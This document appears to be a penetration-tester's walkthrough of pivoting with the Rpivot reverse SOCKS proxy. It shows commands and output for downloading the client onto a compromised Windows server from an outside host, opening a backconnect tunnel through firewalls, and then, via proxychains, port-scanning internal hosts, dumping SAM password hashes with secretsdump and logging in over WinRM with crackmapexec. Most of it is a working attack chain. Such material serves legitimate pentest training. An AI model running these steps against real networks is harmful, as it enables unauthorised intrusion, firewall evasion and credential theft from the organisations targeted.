======================================================================================================================================================
Pivoting with Rpivot (basic example)
======================================================================================================================================================

RPIVOT - reverse socks 4 proxy for penetration tests

=> Github page "https://github.com/klsecservices/rpivot"

RPIVOT allows to tunnel traffic into internal network via socks 4. It works like ssh dynamic port forwarding but in the opposite direction.
> This tool is Python 2.6-2.7 compatible and has no dependencies beyond the standard library. 
> It has client-server architecture. Just run the client on the machine you want to tunnel the traffic through. 
  Server should be started on pentester's machine and listen to incoming connections from the client.
> It works on Kali Linux, Solaris 10, Windows, Mac OS.
> It supports Pass-the-hash and allows to pivot through an NTLM proxy

Context
--------
During penetration tests, Rpivot can be executed on a target Windows or Linux server (or a Windows laptop) to create a tunnel between this target
machine and an Internet-facing remote server belonging to the pentesters (e.g. a Kali VM running in AWS or Azure).
This tool is usefull to pass trhough firewalls and pivot inside a company's internal network after having compromise for example a vulnerable internet-facing 
website or a laptop via a phishing attack.


======================================================================================================================================================
PoC/Example - Step 1 - Run Rpivot server on your attack server (e.g. a Kali Linux VM)
======================================================================================================================================================

=> Github page "https://github.com/klsecservices/rpivot"

jeff@kali:~/Documents/Tools/rpivot/rpivot-master$ sudo python2 server.py --server-port 443 --server-ip 192.168.56.54 --proxy-ip 127.0.0.1 --proxy-port 9050
New connection from host 192.168.56.1, source port 23366


------------------------------------------------------------------
Notes
# apt-get install proxychains
# cp /etc/proxychains.conf /etc/proxychains.conf.backup
# echo "socks4  127.0.0.1 9050" >> /etc/proxychains.conf
------------------------------------------------------------------
Configuration of Proxychains
------------------------------------------------------------------

jeff@kali:~/Documents/Tools/rpivot$ tail /etc/proxychains.conf 
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks5  127.0.0.1 1080
socks4  127.0.0.1 9050


======================================================================================================================================================
PoC/Example - Step 2 - Upload and execute the Rpivot client on a compromised Windows 2016 server (with Microsoft Defender AV enabled and up-to-date)
======================================================================================================================================================

PS C:\temp\> amsiscanbuffer
At line:1 char:1
+ amsiscanbuffer
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent


PS C:\temp> (New-Object Net.WebClient).DownloadFile("http://X.X.X.X/Rpivot-client-v1.exe","C:\temp\Rpivot-client-v1.exe")

PS C:\temp> .\Rpivot-client-v1.exe --server-ip 192.168.56.104 --server-port 443
Backconnecting to server 192.168.56.104 port 443


Note - Command to force Rpivot to go through an NTLM proxy
-----------------------------------------------------------
> python client.py --server-ip <rpivot_server_ip> --server-port <port> --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port <port> --domain <domain> 
                   --username <login> --password <pwd>
OR
> python client.py --server-ip <rpivot_server_ip> --server-port <port> --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port <port> --domain <domain> 
                   --username <login> --hashes <NT-hash>
                     

==========================================================================================================================================================
PoC/Example - Step 3 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Rpivot to pivot into the internal network
==========================================================================================================================================================

Without using Proxychains and the Rpivot tunnel the network connection is filtered to the Windows server '192.168.13.154' from the Kali VM '192.168.56.54'
----------------------------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~$ nmap -sT -Pn 192.168.13.154 -p 445,3389 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-13 18:34 CET
Nmap scan report for 192.168.13.154
Host is up (0.000037s latency).

PORT     STATE    SERVICE
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds


Example 1 - Nmap port scan of the Windows server (192.168.13.154) over the Rpivot tunnel
-----------------------------------------------------------------------------------------

jeff@kali:~$ proxychains nmap -sT 192.168.13.154 -p 445,3389 
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-13 18:33 CET
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:445-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:3389-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 192.168.13.154
Host is up (12s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 28.17 seconds


Example 2 - Secretsdump (impacket) connection to the Windows server (192.168.13.154) over the Rpivot tunnel
------------------------------------------------------------------------------------------------------------

jeff@kali:~$ proxychains impacket-secretsdump server2/administrator@192.168.13.154
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:445-<><>-OK
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xafec958786f8362bf3f02d15<SNIP>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36f7a3ebaa54935ecf036<SNIP>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08<SNIP>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c<SNIP>
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b3b0692c09bb03d1<SNIP>
<SNIP>


Example 3 - Crackmapexec connection to the Windows server (192.168.13.154) over the Rpivot tunnel
-------------------------------------------------------------------------------------------------

jeff@kali:~$ proxychains crackmapexec winrm 192.168.13.154 -u administrator -p <SNIP>
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:5986-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:445-<><>-OK
WINRM       192.168.13.154  5985   NONE             [*] http://192.168.13.154:5985/wsman
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:5985-<><>-OK
WINRM       192.168.13.154  5985   NONE             [+] None\administrator:<SNIP> (Pwn3d!)


